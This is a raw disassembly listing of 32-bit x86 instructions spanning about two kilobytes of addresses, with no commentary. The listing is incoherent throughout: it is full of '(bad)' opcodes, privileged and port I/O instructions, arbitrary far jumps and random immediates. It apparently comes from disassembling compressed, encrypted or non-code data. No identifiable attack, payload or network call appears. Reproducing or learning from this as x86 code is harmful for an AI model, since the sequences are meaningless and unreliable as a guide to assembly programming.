  41fcac:	and    DWORD PTR [edx+edx*4-0x4a24aae],0x8b3dfbe
  41fcb7:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  41fcb9:	sub    esi,edi
  41fcbb:	xchg   edx,eax
  41fcbc:	or     eax,0x460e884e
  41fcc1:	push   cs
  41fcc2:	stos   DWORD PTR es:[edi],eax
  41fcc3:	push   ebp
  41fcc4:	or     al,0x84
  41fcc6:	inc    edi
  41fcc7:	ret    0xf5a
  41fcca:	and    bl,BYTE PTR [ebx-0x5c4382f]
  41fcd0:	jl     0x41fcca
  41fcd2:	(bad)
  41fcd7:	dec    edi
  41fcd8:	lahf   
  41fcd9:	lods   eax,DWORD PTR ds:[esi]
  41fcda:	jmp    0x41fcea
  41fcdc:	ret    
  41fcdd:	dec    ebx
  41fcde:	fld    QWORD PTR [edx+0x60b2b817]
  41fce4:	and    eax,0x5501ade1
  41fce9:	out    0x4,al
  41fceb:	out    dx,eax
  41fcec:	push   esi
  41fced:	fnclex 
  41fcef:	sub    al,0x43
  41fcf1:	cmp    esp,DWORD PTR [edx]
  41fcf3:	xchg   edx,eax
  41fcf4:	inc    esi
  41fcf5:	enter  0xa5d5,0xe1
  41fcf9:	add    dl,al
  41fcfb:	jmp    0x41fd34
  41fcfd:	add    BYTE PTR [esi-0x80],0x4e
  41fd01:	shr    BYTE PTR [eax-0x2e],cl
  41fd04:	lahf   
  41fd05:	loopne 0x41fcca
  41fd07:	cdq    
  41fd08:	stc    
  41fd09:	xor    BYTE PTR [esi-0xa0167ba],al
  41fd0f:	xlat   BYTE PTR ds:[ebx]
  41fd10:	push   cs
  41fd11:	push   ecx
  41fd12:	jo     0x41fd46
  41fd14:	fadd   DWORD PTR [edi+0x2]
  41fd17:	xor    esi,DWORD PTR [eax]
  41fd19:	mov    cl,0xb7
  41fd1b:	stos   DWORD PTR es:[edi],eax
  41fd1c:	push   ebx
  41fd1d:	fstp   QWORD PTR [edi+edx*4]
  41fd20:	fadd   QWORD PTR [eax+0x4b884f8]
  41fd26:	inc    esp
  41fd27:	test   eax,0xeed86147
  41fd2c:	pusha  
  41fd2d:	xor    ebx,DWORD PTR [ebp-0x46]
  41fd30:	adc    al,bl
  41fd32:	enter  0x8579,0x43
  41fd36:	in     eax,dx
  41fd37:	clc    
  41fd38:	lods   eax,DWORD PTR ds:[esi]
  41fd39:	rol    BYTE PTR [edi],0x7d
  41fd3c:	lea    eax,[ecx]
  41fd3e:	sub    dl,BYTE PTR [edx]
  41fd40:	push   es
  41fd41:	out    dx,eax
  41fd42:	and    al,0x8
  41fd44:	sar    BYTE PTR [ebx+0x6e],0xbb
  41fd48:	wrmsr  
  41fd4a:	(bad)  
  41fd4b:	xchg   ebx,eax
  41fd4c:	mov    bl,0x67
  41fd4e:	jmp    0xc02:0xae66825d
  41fd55:	xchg   ebp,eax
  41fd56:	push   eax
  41fd57:	pop    ebx
  41fd58:	loopne 0x41fd19
  41fd5a:	pop    edx
  41fd5b:	(bad)
  41fd5e:	sti    
  41fd5f:	xor    BYTE PTR [esi],dh
  41fd61:	or     DWORD PTR [ebx+0x7c0948d3],edi
  41fd67:	mov    cl,0x95
  41fd69:	cs xor cl,al
  41fd6c:	mov    esi,0x406c7705
  41fd71:	push   ss
  41fd72:	repnz scas al,BYTE PTR es:[edi]
  41fd74:	arpl   WORD PTR [ebx],si
  41fd76:	adc    BYTE PTR [ebx+0x3e],al
  41fd79:	rcr    BYTE PTR [edx-0xbacc482],cl
  41fd7f:	lds    edx,FWORD PTR [esi-0x7ec01214]
  41fd85:	cmp    BYTE PTR ds:0xf85f2631,ah
  41fd8b:	fucom  st(1)
  41fd8d:	sbb    al,0x44
  41fd8f:	sbb    BYTE PTR [ebx],dl
  41fd91:	lea    edx,[edx+0x48]
  41fd94:	imul   ecx,DWORD PTR [edi],0x921d22dc
  41fd9a:	out    0x8f,al
  41fd9c:	jg     0x41fdea
  41fd9e:	es cmp ch,dh
  41fda1:	sub    BYTE PTR [esi-0x69c940f3],0xe5
  41fda8:	test   BYTE PTR [eax+edx*4+0x1720df46],0xbf
  41fdb0:	lea    ebx,[ecx+0x6b0e4448]
  41fdb6:	dec    edx
  41fdb7:	push   0xe087767d
  41fdbc:	jnp    0x41fe3a
  41fdbe:	es iret 
  41fdc0:	push   edx
  41fdc1:	push   eax
  41fdc2:	mov    ebx,0xddabc04a
  41fdc7:	(bad)  
  41fdc8:	das    
  41fdc9:	push   cs
  41fdca:	xor    al,0x6e
  41fdcc:	in     eax,0x33
  41fdce:	or     al,0x1b
  41fdd0:	repz push cs
  41fdd2:	pop    ebx
  41fdd3:	sub    al,0x43
  41fdd5:	sbb    eax,0x703a7a0a
  41fdda:	pop    ds
  41fddb:	adc    eax,0xca65a76b
  41fde0:	xchg   ebp,eax
  41fde1:	push   esi
  41fde2:	sbb    BYTE PTR [ebx-0x3a5e66a0],al
  41fde8:	pop    ebx
  41fde9:	enter  0x23eb,0x8a
  41fded:	sbb    WORD PTR [eax+0x18fe380d],dx
  41fdf4:	repnz ss push ebx
  41fdf7:	cdq    
  41fdf8:	retf   0xd856
  41fdfb:	icebp  
  41fdfc:	sahf   
  41fdfd:	jecxz  0x41fd96
  41fdff:	sub    ch,BYTE PTR [esi+0x7417227a]
  41fe05:	fnstcw WORD PTR [esi+0x3a8d9f4a]
  41fe0b:	lock imul eax,DWORD PTR [eax-0x69c68b78],0xffffffb4
  41fe13:	outs   dx,BYTE PTR ds:[esi]
  41fe14:	lea    esp,[edx+0x1c]
  41fe17:	push   esp
  41fe18:	cld    
  41fe19:	and    al,0x62
  41fe1b:	xchg   ebp,eax
  41fe1c:	daa    
  41fe1d:	fcom   QWORD PTR [ebp-0x2adb9c0f]
  41fe23:	jmp    FWORD PTR [eax+0x56bbff13]
  41fe29:	xchg   DWORD PTR [edx],esi
  41fe2b:	dec    eax
  41fe2c:	mov    ?,WORD PTR [edx]
  41fe2e:	xchg   edx,eax
  41fe2f:	jg     0x41fe33
  41fe31:	imul   esp,DWORD PTR [eax-0x49],0xd9133ec3
  41fe38:	test   BYTE PTR [edx+0x58c320ce],0x0
  41fe3f:	dec    edi
  41fe40:	mov    edx,0x9e32abc0
  41fe45:	sahf   
  41fe46:	xor    DWORD PTR [edi],edi
  41fe48:	cmp    al,0x9c
  41fe4a:	jnp    0x41fe23
  41fe4c:	xchg   esp,eax
  41fe4d:	push   cs
  41fe4e:	call   0xe4587546
  41fe53:	mov    esp,0x2a14d85a
  41fe58:	and    DWORD PTR [edx-0x39818e1c],esi
  41fe5e:	jg     0x41fe83
  41fe60:	xor    cl,BYTE PTR [edi]
  41fe62:	out    0x41,eax
  41fe64:	sub    esp,esi
  41fe66:	ret    0x6a08
  41fe69:	mov    ds:0x81d594db,al
  41fe6e:	cdq    
  41fe6f:	dec    eax
  41fe70:	ret    0x28b1
  41fe73:	sahf   
  41fe74:	add    bl,ah
  41fe76:	test   al,0xc5
  41fe78:	jb     0x41fe47
  41fe7a:	shl    BYTE PTR [esi+0x5153287c],1
  41fe80:	sub    ecx,DWORD PTR [edx]
  41fe82:	scas   eax,DWORD PTR es:[edi]
  41fe83:	mov    ah,0xb
  41fe85:	dec    esp
  41fe86:	dec    ecx
  41fe87:	cmp    DWORD PTR [eax+0x3e],edi
  41fe8a:	mov    esi,0x5c112444
  41fe8f:	pop    es
  41fe90:	xchg   ebx,eax
  41fe91:	fimul  DWORD PTR [esi+0x2]
  41fe94:	mov    esp,0x111e4abb
  41fe99:	mov    gs,WORD PTR [eax]
  41fe9b:	in     al,0x2a
  41fe9d:	sti    
  41fe9e:	push   cs
  41fe9f:	mov    bh,0xea
  41fea1:	mov    ebx,0x85386453
  41fea6:	inc    edi
  41fea7:	loop   0x41ff00
  41fea9:	jae    0x41febd
  41feab:	imul   eax,DWORD PTR [eax-0x7efb9b3a],0x29
  41feb2:	mov    al,BYTE PTR [eax]
  41feb4:	out    dx,al
  41feb5:	lock mov eax,0xdc4187eb
  41febb:	ret    0x3aa0
  41febe:	ror    DWORD PTR ds:0xdb696874,0x20
  41fec5:	jecxz  0x41ff3c
  41fec7:	mov    esi,DWORD PTR [ecx+0xa126ef6]
  41fecd:	mov    dh,0xc
  41fecf:	loope  0x41fead
  41fed1:	fnstenv [esi]
  41fed3:	jmp    FWORD PTR [edi-0x4c408703]
  41fed9:	push   0x72
  41fedb:	or     dh,BYTE PTR [ecx]
  41fedd:	sbb    eax,0x36fed7a1
  41fee3:	sbb    DWORD PTR [eax+0x29647600],0xffffffb8
  41feea:	ja     0x41fe7f
  41feec:	inc    edx
  41feed:	xor    al,0x32
  41feef:	lods   al,BYTE PTR ds:[esi]
  41fef0:	fdiv   QWORD PTR [eax+0x46]
  41fef3:	cld    
  41fef4:	inc    ebx
  41fef5:	push   eax
  41fef6:	call   0x6f83:0x707f57c2
  41fefd:	jmp    FWORD PTR [ecx-0xbfedc4a]
  41ff03:	jmp    0x41ff52
  41ff05:	fwait
  41ff06:	cmp    eax,0x93d66329
  41ff0b:	ss (bad) 
  41ff0d:	jb     0x41feed
  41ff0f:	mov    bl,0xd6
  41ff11:	pop    ebp
  41ff12:	hlt    
  41ff13:	and    esp,DWORD PTR [eax-0x2a]
  41ff16:	cdq    
  41ff17:	mov    dh,cl
  41ff19:	fdiv   QWORD PTR [esi-0x4c]
  41ff1c:	xchg   ebp,eax
  41ff1d:	push   0x7a
  41ff1f:	jmp    0xf4f8a21a
  41ff24:	push   0x3342706d
  41ff29:	pop    es
  41ff2a:	retf   
  41ff2b:	adc    DWORD PTR [edi],0xffffffee
  41ff2e:	rcr    BYTE PTR [ebx+0x11],0x6a
  41ff32:	rcl    BYTE PTR [ebx-0x70],cl
  41ff35:	out    dx,eax
  41ff36:	pop    esp
  41ff37:	jecxz  0x41fef4
  41ff39:	loop   0x41ff5e
  41ff3b:	outs   dx,BYTE PTR ds:[esi]
  41ff3c:	sub    eax,DWORD PTR [ebx]
  41ff3e:	std    
  41ff3f:	push   edx
  41ff40:	es cdq 
  41ff42:	popf   
  41ff43:	test   DWORD PTR [eax+0x72],edx
  41ff46:	mov    bl,0x31
  41ff48:	xchg   BYTE PTR [ebp-0x38a37e82],bl
  41ff4e:	neg    BYTE PTR [ebx+0x5b]
  41ff51:	loope  0x41ffa6
  41ff53:	and    esp,ecx
  41ff55:	in     al,dx
  41ff56:	jge    0x41ff49
  41ff58:	xor    esi,edx
  41ff5a:	cmp    al,0xcb
  41ff5c:	dec    ebp
  41ff5d:	jnp    0x41ff05
  41ff5f:	dec    esi
  41ff60:	push   0x1f
  41ff62:	loop   0x41ff1d
  41ff64:	pushf  
  41ff65:	int    0x32
  41ff67:	loop   0x41feef
  41ff69:	test   BYTE PTR [ecx+ebp*4-0x6d5d17a8],dh
  41ff70:	jo     0x41ff34
  41ff72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff73:	scas   eax,DWORD PTR es:[edi]
  41ff74:	inc    edi
  41ff75:	loope  0x41ff5d
  41ff77:	retf   
  41ff78:	add    al,BYTE PTR [esp+esi*1-0x1e7f205d]
  41ff7f:	mov    edx,0xc056e657
  41ff84:	jg     0x420002
  41ff86:	add    ecx,ecx
  41ff88:	jno    0x41ff1c
  41ff8a:	test   al,0xff
  41ff8c:	xchg   esi,eax
  41ff8d:	xchg   esi,eax
  41ff8e:	push   ds
  41ff8f:	fldenv [ecx+0x21]
  41ff92:	adc    eax,0xe3d34d6b
  41ff97:	xlat   BYTE PTR ds:[ebx]
  41ff98:	push   0x25
  41ff9a:	xor    dh,BYTE PTR [ebx+0x7314adff]
  41ffa0:	push   ds
  41ffa1:	lods   al,BYTE PTR ds:[esi]
  41ffa2:	leave  
  41ffa3:	in     eax,0x86
  41ffa5:	cwde   
  41ffa6:	push   ds
  41ffa7:	in     eax,dx
  41ffa8:	jl     0x420018
  41ffaa:	(bad)  
  41ffab:	retf   
  41ffac:	mov    bl,bh
  41ffae:	dec    edx
  41ffaf:	fisub  DWORD PTR [eax-0x14]
  41ffb2:	ret    
  41ffb3:	and    esp,DWORD PTR [ebx]
  41ffb5:	jmp    0x733a:0x973f24d1
  41ffbc:	arpl   WORD PTR [ecx],bx
  41ffbe:	cld    
  41ffbf:	mov    ecx,eax
  41ffc1:	fcom   QWORD PTR [esi]
  41ffc3:	cmp    eax,DWORD PTR [edi]
  41ffc5:	mov    eax,0xdbb4e376
  41ffca:	imul   DWORD PTR [esi]
  41ffcc:	sub    al,0xfa
  41ffce:	cmp    al,0x70
  41ffd0:	imul   edx,ebp,0x9c01def9
  41ffd6:	clc    
  41ffd7:	(bad)  
  41ffd9:	adc    esi,DWORD PTR [esi-0x1]
  41ffdc:	lock xchg ebp,eax
  41ffde:	mov    bl,BYTE PTR [eax+0x3d]
  41ffe1:	mov    dh,BYTE PTR [ecx+0x72]
  41ffe4:	push   ebx
  41ffe5:	or     ah,0xf5
  41ffe8:	ins    DWORD PTR es:[edi],dx
  41ffe9:	bound  ebp,QWORD PTR es:[eax]
  41ffec:	aas    
  41ffed:	push   ebx
  41ffee:	stc    
  41ffef:	sub    BYTE PTR [esi+0xa],dl
  41fff2:	push   ebp
  41fff3:	mov    ebx,0x2cc2d0d2
  41fff8:	dec    edx
  41fff9:	sub    DWORD PTR [ebp+0x5bd42a4f],0xffffffb0
  420000:	cdq    
  420001:	jb     0x41ffca
  420003:	sahf   
  420004:	mov    cl,BYTE PTR [ebx]
  420006:	scas   eax,DWORD PTR es:[edi]
  420007:	scas   eax,DWORD PTR es:[edi]
  420008:	inc    eax
  420009:	mov    ch,BYTE PTR [eax-0x2abe9a2]
  42000f:	mov    eax,0xdbd4a32c
  420014:	sbb    edi,0x9bfe5443
  42001a:	jo     0x41ffc3
  42001c:	ror    al,0x8f
  42001f:	sahf   
  420020:	cmp    eax,0x21b96a3b
  420025:	mov    cl,0x45
  420027:	mov    ch,0x1
  420029:	scas   al,BYTE PTR es:[edi]
  42002a:	rcr    ebx,1
  42002c:	sbb    dl,BYTE PTR [esi+0x2722e48f]
  420032:	ret    0xab66
  420035:	aas    
  420036:	div    BYTE PTR [ebx-0x6bb7e920]
  42003c:	ret    
  42003d:	ss call 0xa2d9:0xd1093cca
  420045:	xor    eax,0x250ee72
  42004a:	in     eax,dx
  42004b:	arpl   bp,bp
  42004d:	xor    al,0xa0
  42004f:	pop    ecx
  420050:	pop    esi
  420051:	in     eax,0xfb
  420053:	mov    esp,DWORD PTR [esi]
  420055:	loopne 0x420036
  420057:	mov    esi,DWORD PTR [ebx+0x60a12649]
  42005d:	sbb    al,0xb5
  42005f:	out    0x58,al
  420061:	cmp    esp,DWORD PTR [edi]
  420063:	loop   0x4200e2
  420065:	(bad)  
  420066:	pop    edi
  420067:	pop    ds
  420068:	cmp    ah,BYTE PTR [eax-0x1fdac29]
  42006e:	lock adc BYTE PTR [edx+0x47cdf53a],dh
  420075:	int3   
  420076:	xor    ch,BYTE PTR [esi+esi*4+0x70]
  42007a:	cmp    al,0x49
  42007c:	cld    
  42007d:	out    dx,eax
  42007e:	sbb    ecx,DWORD PTR [esi]
  420080:	push   edx
  420081:	fstp   DWORD PTR [eax+0x5a44a81d]
  420087:	mov    ecx,0x698f68b1
  42008c:	imul   edi,DWORD PTR ds:0x12f0abed,0xe231cbee
  420096:	icebp  
  420097:	mov    dl,0xeb
  420099:	lods   eax,DWORD PTR ds:[esi]
  42009a:	les    eax,FWORD PTR [esi-0x8]
  42009d:	les    eax,FWORD PTR [eax]
  42009f:	sub    esi,DWORD PTR [ebp-0x4fb1eb56]
  4200a5:	imul   eax,DWORD PTR [esi+0x437380e7],0xbdad9706
  4200af:	sbb    al,0x22
  4200b1:	cmp    al,0x7c
  4200b3:	(bad)  
  4200b4:	outs   dx,DWORD PTR ds:[esi]
  4200b5:	in     al,0x8d
  4200b7:	inc    esi
  4200b8:	push   edx
  4200b9:	cmp    eax,DWORD PTR [ebp-0x307fa0fb]
  4200bf:	push   edx
  4200c0:	aam    0xb
  4200c2:	hlt    
  4200c3:	push   es
  4200c4:	shl    al,cl
  4200c6:	lods   eax,DWORD PTR ds:[esi]
  4200c7:	xchg   esi,eax
  4200c8:	fst    QWORD PTR [edx+0xb]
  4200cb:	adc    eax,0x9ae6e593
  4200d0:	stos   DWORD PTR es:[edi],eax
  4200d1:	mov    bl,0x1e
  4200d3:	xchg   esp,eax
  4200d4:	xor    BYTE PTR [eax+eiz*8+0x1fc17845],dh
  4200db:	mov    ds:0x523ab8cc,al
  4200e0:	push   esp
  4200e1:	push   esp
  4200e2:	pop    esp
  4200e3:	ror    ecx,cl
  4200e5:	rcl    dh,1
  4200e7:	mov    BYTE PTR [edi+0x4e],ch
  4200ea:	sbb    al,0xe1
  4200ec:	sbb    DWORD PTR [ebx+0x1bcf57d9],esi
  4200f2:	(bad)  
  4200f3:	fsubr  DWORD PTR [ecx]
  4200f5:	jmp    0x420161
  4200f7:	cmp    ch,BYTE PTR [ecx]
  4200f9:	ds data16 cli 
  4200fc:	int    0xba
  4200fe:	cmp    BYTE PTR [ebx],0xf0
  420101:	enter  0x2de,0x6d
  420105:	dec    eax
  420106:	jb     0x420179
  420108:	pushf  
  420109:	(bad)  
  42010a:	daa    
  42010b:	jnp    0x420095
  42010d:	or     esp,ebx
  42010f:	sahf   
  420110:	ficom  WORD PTR [ecx+0x40]
  420113:	(bad)  
  420114:	push   ebp
  420115:	jb     0x4200a5
  420117:	dec    esp
  420118:	add    ah,BYTE PTR [ebx-0x7]
  42011b:	(bad)  
  42011c:	fwait
  42011d:	sbb    al,al
  42011f:	icebp  
  420120:	inc    DWORD PTR [edx-0x2b]
  420123:	xchg   ecx,eax
  420124:	push   edx
  420125:	into   
  420126:	sub    BYTE PTR [eax-0x9060173],ah
  42012c:	ja     0x420114
  42012e:	fsubr  QWORD PTR [edx]
  420130:	dec    ebp
  420131:	imul   edi,DWORD PTR [eax],0xbce5bc75
  420137:	pop    ebx
  420138:	in     eax,0xe2
  42013a:	aas    
  42013b:	clc    
  42013c:	jns    0x42016f
  42013e:	je     0x420148
  420140:	sub    dh,BYTE PTR [ecx-0x74028d88]
  420146:	xchg   ebx,eax
  420147:	(bad)  
  420148:	les    eax,FWORD PTR [ebx-0x57]
  42014b:	fldlg2 
  42014d:	xchg   cl,bh
  42014f:	jne    0x4201b7
  420151:	push   edi
  420152:	mov    edx,0x991795f0
  420157:	cmp    al,BYTE PTR [esi+ebp*8]
  42015a:	in     al,0x70
  42015c:	imul   ecx,esp,0x1e93cde9
  420162:	push   0xffffffc8
  420164:	mov    dl,0x9
  420166:	inc    esi
  420167:	xlat   BYTE PTR ds:[ebx]
  420168:	push   ss
  420169:	not    DWORD PTR [eax]
  42016b:	outs   dx,DWORD PTR ds:[esi]
  42016c:	push   edx
  42016d:	idiv   DWORD PTR [ebp-0x6c]
  420170:	addr16 sti 
  420172:	dec    ebp
  420173:	and    eax,0x7f2342bf
  420178:	mov    ecx,0xcb3fd4ac
  42017d:	jp     0x4201bd
  42017f:	lahf   
  420180:	mov    edx,0xf8108cd8
  420185:	(bad)  [ecx-0x3674069f]
  42018b:	lods   al,BYTE PTR ds:[esi]
  42018c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42018d:	xlat   BYTE PTR ds:[ebx]
  42018e:	pop    ebp
  42018f:	fistp  DWORD PTR [esi-0x3d]
  420192:	jo     0x420199
  420194:	ret    
  420195:	xchg   esp,eax
  420196:	pop    bp
  420198:	or     BYTE PTR [esi+0xa623fa1],dl
  42019e:	mov    al,ds:0xda791f53
  4201a3:	gs jnp 0x420185
  4201a6:	cmp    edi,ecx
  4201a8:	stc    
  4201a9:	loop   0x420198
  4201ab:	mov    bh,0x7b
  4201ad:	pop    es
  4201ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201af:	sub    DWORD PTR [edx],0x2c2b0ac9
  4201b5:	iret   
  4201b6:	mov    esp,DWORD PTR ds:0xba63f7f9
  4201bc:	dec    ecx
  4201bd:	cmp    bl,dl
  4201bf:	inc    esi
  4201c0:	sahf   
  4201c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201c2:	retf   
  4201c3:	dec    eax
  4201c4:	pushf  
  4201c5:	in     eax,dx
  4201c6:	dec    esi
  4201c7:	and    esp,DWORD PTR [ebx]
  4201c9:	in     eax,0x8b
  4201cb:	stos   BYTE PTR es:[edi],al
  4201cc:	dec    edi
  4201cd:	or     eax,0xff188731
  4201d2:	adc    esp,DWORD PTR [esi]
  4201d4:	push   0xffffffb4
  4201d6:	inc    edx
  4201d7:	xor    bl,bl
  4201d9:	(bad)  
  4201da:	push   esp
  4201db:	mov    ebx,0xdbb10efb
  4201e0:	mov    al,ds:0xac0acd6f
  4201e5:	or     dl,al
  4201e7:	popa   
  4201e8:	xlat   BYTE PTR es:[ebx]
  4201ea:	test   al,0xa
  4201ec:	scas   al,BYTE PTR es:[edi]
  4201ed:	neg    ecx
  4201ef:	xor    eax,0x2113c774
  4201f4:	jmp    0x4201e5
  4201f6:	jecxz  0x4201fc
  4201f8:	xchg   esi,eax
  4201f9:	sti    
  4201fa:	icebp  
  4201fb:	push   ss
  4201fc:	dec    edi
  4201fd:	fwait
  4201fe:	ret    
  4201ff:	dec    esi
  420200:	cmc    
  420201:	sub    bh,BYTE PTR [esi-0x11]
  420204:	sub    DWORD PTR [edx+ebp*2-0x27],eax
  420208:	call   0xd7dc:0xdc478447
  42020f:	mov    edi,cs
  420211:	jg     0x420257
  420213:	scas   eax,DWORD PTR es:[edi]
  420214:	sub    eax,0x156dad10
  420219:	fld    DWORD PTR [eax]
  42021b:	gs mov bl,0x3a
  42021e:	lods   al,BYTE PTR ds:[esi]
  42021f:	sbb    DWORD PTR [esp+edi*1],0x78
  420223:	jp     0x420236
  420225:	and    eax,0xea007d64
  42022a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42022b:	out    0x36,al
  42022d:	fcomp  QWORD PTR [edx]
  42022f:	sbb    ah,BYTE PTR [edi+0x78]
  420232:	mov    BYTE PTR [edi],al
  420234:	xchg   DWORD PTR [ebp-0x452a2855],ecx
  42023a:	xchg   ebp,eax
  42023b:	inc    ebp
  42023c:	fild   WORD PTR [ebx-0x35]
  42023f:	jecxz  0x4201dd
  420241:	mov    bl,0xc5
  420243:	aas    
  420244:	xchg   ecx,eax
  420246:	push   0x50
  420248:	pop    esp
  420249:	push   ebx
  42024a:	xchg   edi,eax
  42024b:	repnz shr dh,cl
  42024e:	push   eax
  42024f:	mov    bh,BYTE PTR [ecx]
  420251:	ret    0xa33e
  420254:	mov    ebx,0x9c7cd4d1
  420259:	aaa    
  42025a:	mov    al,ds:0x6356be0b
  42025f:	mov    ds:0x9195708,al
  420264:	ret    
  420265:	mov    ebp,0x50e1579b
  42026a:	mov    edx,0x5595234f
  42026f:	jb     0x4202ae
  420271:	out    0xb5,al
  420273:	fisttp WORD PTR [ebp+0x4d]
  420276:	adc    DWORD PTR [ecx],0xb1dde793
  42027c:	sbb    eax,0x2913291c
  420281:	ror    DWORD PTR [esi-0x43e1fee7],1
  420287:	aad    0xac
  420289:	imul   ebp,DWORD PTR [eax+0x62],0x59
  42028d:	pop    edx
  42028e:	icebp  
  42028f:	ret    
  420290:	push   0x9f8651e5
  420295:	jno    0x42029c
  420297:	and    cl,BYTE PTR [edi+0x557aaaca]
  42029d:	adc    DWORD PTR [edi+0xd],ecx
  4202a0:	adc    BYTE PTR [ecx-0x3ff40946],0xc3
  4202a7:	enter  0xdd2f,0x34
  4202ab:	dec    ebp
  4202ac:	pusha  
  4202ad:	vmovd  xmm6,DWORD PTR [edi+0x4ce52b23]
  4202b5:	push   ebx
  4202b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202b7:	push   ecx
  4202b8:	sub    BYTE PTR [ebx-0x66],0xf8
  4202bc:	ret    0x6e12
  4202bf:	pop    eax
  4202c0:	nop
  4202c1:	and    esp,DWORD PTR [ecx+0x19]
  4202c4:	int    0x48
  4202c6:	out    dx,eax
  4202c7:	ret    
  4202c8:	retf   0xf714
  4202cb:	inc    edi
  4202cc:	push   edi
  4202cd:	lods   al,BYTE PTR ds:[esi]
  4202ce:	xor    al,0x21
  4202d0:	idiv   DWORD PTR [esi+ebx*4]
  4202d3:	push   ecx
  4202d4:	cmp    DWORD PTR [edi-0x4b],ecx
  4202d7:	or     al,0x36
  4202d9:	pop    ebp
  4202da:	add    dl,BYTE PTR [eax-0x51a8564d]
  4202e0:	in     eax,0x65
  4202e2:	push   es
  4202e3:	nop
  4202e4:	aas    
  4202e5:	mov    al,ds:0x3094ab39
  4202ea:	mov    BYTE PTR [edi],ch
  4202ec:	mov    dh,0x49
  4202ee:	mov    eax,0x664ddd77
  4202f3:	test   eax,0xe329a320
  4202f8:	shl    DWORD PTR [eax+0x1c],cl
  4202fb:	push   eax
  4202fc:	or     eax,0x69fdf562
  420301:	jl     0x4202ca
  420303:	icebp  
  420304:	test   ah,dh
  420306:	pop    ss
  420307:	std    
  420308:	and    ebx,0x69171491
  42030e:	outs   dx,BYTE PTR ds:[esi]
  42030f:	jmp    0x720b:0xe4d2c510
  420316:	div    DWORD PTR [eax+eax*4-0x56]
  42031a:	ins    BYTE PTR es:[edi],dx
  42031b:	neg    BYTE PTR ds:0x5804d27d
  420321:	mov    ecx,0x1300b44f
  420326:	push   eax
  420327:	stc    
  420328:	pop    edi
  420329:	fcom   st(6)
  42032b:	and    eax,0xb2a0ba83
  420330:	lods   eax,DWORD PTR ds:[esi]
  420331:	pop    ds
  420332:	or     eax,0x9b79a743
  420337:	out    0x9a,al
  420339:	add    edi,DWORD PTR [esi+0xb]
  42033c:	aad    0xd0
  42033e:	inc    ebp
  42033f:	or     edi,DWORD PTR [ecx-0x7a08b4b7]
  420345:	mov    BYTE PTR [edi+0x4bd2c7a9],dl
  42034b:	iret   
  42034c:	ror    BYTE PTR [eax+0x8],1
  42034f:	push   eax
  420350:	sbb    dh,BYTE PTR [ebp*1+0x79076280]
  420357:	push   ds
  420358:	repz mov dh,0xe2
  42035b:	fucomip st,st(2)
  42035d:	call   0xb7773ec5
  420362:	(bad)  
  420364:	fld    TBYTE PTR [edi+0x70]
  420367:	dec    edi
  420368:	dec    esp
  420369:	loopne 0x4203a3
  42036b:	dec    eax
  42036c:	jecxz  0x42034e
  42036e:	add    DWORD PTR [esi-0x1a4f290],0xffffffb0
  420375:	adc    edi,DWORD PTR [eax]
  420377:	sbb    eax,0x28deec9b
  42037c:	or     esp,0x56de549c
  420382:	inc    esp
  420383:	in     al,0xd6
  420385:	addr16 cld 
  420387:	mov    edx,DWORD PTR [edx-0x17a62d49]
  42038d:	popaw  
  42038f:	adc    edi,ecx
  420391:	fmul   st(3),st
  420393:	jmp    0x4636b179
  420398:	leave  
  420399:	(bad)  
  42039a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42039b:	inc    ebp
  42039c:	adc    eax,ebp
  42039e:	inc    ecx
  42039f:	inc    esp
  4203a0:	sar    esp,1
  4203a2:	mov    esp,0x1343361
  4203a7:	or     al,BYTE PTR [ebx+0x59]
  4203aa:	push   ebp
  4203ab:	fcmovnbe st,st(0)
  4203ad:	jle    0x4203e3
  4203af:	pop    eax
  4203b0:	test   esi,ebp
  4203b2:	and    al,0x8c
  4203b4:	sub    bh,BYTE PTR [edx+eiz*4]
  4203b7:	cmp    eax,0xc3bc38b6
  4203bc:	je     0x420372
  4203be:	push   cs
  4203bf:	mov    edx,ebx
  4203c1:	pop    esi
  4203c2:	(bad)  
  4203c3:	scas   eax,DWORD PTR es:[edi]
  4203c4:	in     eax,0x2b
  4203c6:	bound  eax,QWORD PTR [ebx-0x26a51dc7]
  4203cc:	clc    
  4203cd:	(bad)  
  4203cf:	push   es
  4203d0:	in     eax,dx
  4203d1:	mov    eax,ds:0xdfe89d86
  4203d6:	shl    DWORD PTR [esi-0x53],1
  4203d9:	(bad)  
  4203da:	jecxz  0x420435
  4203dc:	adc    ebp,DWORD PTR [edx+ebp*1+0x33]
  4203e0:	test   DWORD PTR ss:[eax],0xaeb78adc
  4203e7:	je     0x42043d
  4203e9:	mov    esp,0x6d243570
  4203ee:	pop    esp
  4203ef:	push   esi
  4203f0:	jge    0x4203cc
  4203f2:	sub    esp,eax
  4203f4:	clc    
  4203f5:	jb     0x420461
  4203f7:	lods   eax,DWORD PTR ds:[esi]
  4203f8:	jbe    0x4203cc
  4203fa:	add    eax,0xf988f0a7
  4203ff:	fld    QWORD PTR [ebx]
  420401:	jns    0x420445
  420403:	aad    0xf4
  420405:	(bad)  
  420406:	int    0x65
  420408:	fnstcw WORD PTR [ebx-0x1e]
  42040b:	inc    ebp
  42040c:	cmc    
  42040d:	cs push 0x4db0419e
  420413:	lahf   
  420414:	xor    BYTE PTR [ebp-0x37],ch
  420417:	cs dec ecx
  420419:	lock push ebx
  42041b:	jl     0x4203f1
  42041d:	sar    DWORD PTR [edi-0x38],cl
  420420:	into   
  420421:	out    dx,eax
  420422:	adc    DWORD PTR [eax],eax
  420424:	dec    ebp
  420425:	fcomp  DWORD PTR [ebx+0xa7d53bd]
  42042b:	mov    al,ds:0xdb08e808
  420430:	mov    WORD PTR [edx],gs
  420432:	inc    BYTE PTR [edi+0x1e]
  420435:	retf   
  420436:	into   
  420437:	push   esp
  420438:	push   edi
  420439:	push   ebx
  42043a:	push   ss
  42043b:	dec    ecx
  42043c:	add    eax,0x444fdd1b
  420441:	js     0x420436
  420443:	push   edx
  420444:	inc    esp
  420445:	cld    
  420446:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420447:	bsf    ebp,DWORD PTR [ebp+0x294bf5b6]
  42044e:	or     eax,0x1c610a8e
